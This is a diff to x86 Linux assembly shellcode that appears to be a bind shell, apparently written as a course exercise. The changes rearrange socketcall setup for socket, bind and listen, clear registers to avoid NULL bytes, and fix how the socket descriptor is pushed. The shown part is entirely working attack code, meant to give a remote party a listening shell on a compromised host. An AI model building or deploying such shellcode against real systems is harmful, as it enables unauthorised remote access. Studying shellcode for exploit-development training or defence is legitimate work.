@@ -58,11 +58,11 @@ _start:
 	xor eax, eax	; clean up eax to eliminate NULL bytes
 	xor ebx, ebx	; clean up ebx to eliminate NULL bytes
 	xor ecx, ecx	; clean up ecx to eliminate NULL bytes
-	mov al, 0x66 	; define __NR_socketcall  102 (0x66)
-	mov bl, 0x1	; define SYS_SOCKET   1 (0x1)
 	push 0x6	; 3rd parameter TCP protocol to SYS_SOCKET
 	push 0x1	; 2nd parameter SOCK_STREAM to SYS_SOCKET
 	push 0x2	; 1st parameter AF_INET
+	mov al, 0x66 	; define __NR_socketcall  102 (0x66)
+	mov bl, 0x1	; define SYS_SOCKET   1 (0x1)
 	mov ecx, esp	; ecx now contains address to top of stack for parameters
 	int 0x80	; execute
 
@@ -107,7 +107,7 @@ call_bind:
 	mov edx, esp	; store the stack address (of our struct)
 	push 0x10	; store length addr on stack
 	push edx	; now we need to push the pointer to our struct onto stack
-	push word [edi]	; here's our returned socketfd from our SOCKET
+	push edi	; here's our returned socketfd from our SOCKET only 1 byte
 	xor eax, eax	; clean out eax again
 	mov al, 0x66	; define __NR_socketcall  102 (0x66)
 	mov bl, 0x2	; define SYS_BIND  2 (0x2)
@@ -125,11 +125,13 @@ listener:
 	; for accept()
 
 	xor eax, eax	; clean out eax
-	mov al, 0x66	; define __NR_socketcall  102 (0x66)
 	xor ebx, ebx	; clean out ebx
-	mov bl, 0x4	; define SYS_LISTEN  4
+	xor ecx, ecx	; clean out ecx
 	push 0x1	; int backlog
-	push word [edi]	; int sockfd
+	push edi	; int sockfd only a byte
+	mov al, 0x66	; define __NR_socketcall  102 (0x66)
+	mov bl, 0x4	; define SYS_LISTEN  4
+	mov ecx, esp	; parameters into ecx
 	int 0x80	; call it
 
 accept_connect:
